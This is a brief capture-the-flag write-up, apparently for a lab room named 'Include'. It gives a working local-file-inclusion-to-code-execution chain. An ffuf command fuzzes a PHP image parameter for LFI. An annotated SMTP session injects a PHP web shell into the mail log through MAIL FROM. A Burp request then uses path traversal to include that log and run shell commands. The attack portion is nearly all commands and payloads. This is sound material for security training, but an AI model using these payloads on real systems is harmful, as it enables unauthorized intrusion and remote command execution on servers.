# Include

Fuzz to get the LFI

```
22:33:29 ~/bin/ffuf [master]
➤ ./ffuf -u 'http://10.65.153.228:50000/profile.php?img=FUZZ' -w ../../utils/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0,17 -b "PHPSESSID=lf0ohmk4bl6tepel9espo13tbt"
```

## Mail log poisoning

```
# Connect to the SMTP server on port 25 using netcat
$ nc include.thm 25
# Server banner: 220 means “service ready”
220 include.thm ESMTP Postfix

# Introduce yourself with EHLO (modern). If EHLO fails, use HELO instead.
EHLO include.thm
# 250 lines enumerate server capabilities and confirm it accepted EHLO
250-include.thm
250-PIPELINING
250-SIZE 10240000
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN

# Poisoning step: put raw PHP into MAIL FROM to trigger a syntax error.
# The “bad” syntax is intentional; Postfix will log the offending line to /var/log/mail.log.
MAIL FROM: <?php system($_GET['cmd']); ?>
# 501 is “syntax error in parameters or arguments” (expected here).
# Even though it’s rejected, the line (containing our PHP) is logged.
501 5.1.7 Bad sender address syntax

# Optional: add more log lines by attempting a recipient.
# Not required for the exploit; helps confirm activity in the log.
RCPT TO:<root@localhost>
# If the recipient is acceptable, you’ll see 250 Ok (or 550 if unavailable).
250 2.1.5 Ok

# Optional: DATA phase to further confirm log entries exist.
# You don’t need a valid message for the exploit; the MAIL FROM rejection is enough.
DATA
# 354 tells you to send message data and terminate with a single dot on its own line.
354 End data with <CR><LF>.<CR><LF>
# (Body content—unimportant to the exploit)
test
.
# 250 Ok: the message was queued (if the RCPT was accepted).
250 2.0.0 Ok: queued as 12345

# Cleanly close the SMTP session
QUIT
# 221 Bye: server closing the connection
221 2.0.0 Bye
```

Burp request to run commands

```
GET /profile.php?img=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/log/mail.log&cmd=ls+-la+/var/www/html HTTP/1.1
Host: 10.65.153.228:50000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: */*
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=lf0ohmk4bl6tepel9espo13tbt; connect.sid=s%3APonxgtW11T8I495_5RVvFsIQ3E65AX2C.qP%2FZIw9fmEWJDxGGWjSl06CsDfXZehzw5349k%2BATSdc
Priority: u=4
Cache-Control: max-age=0
```
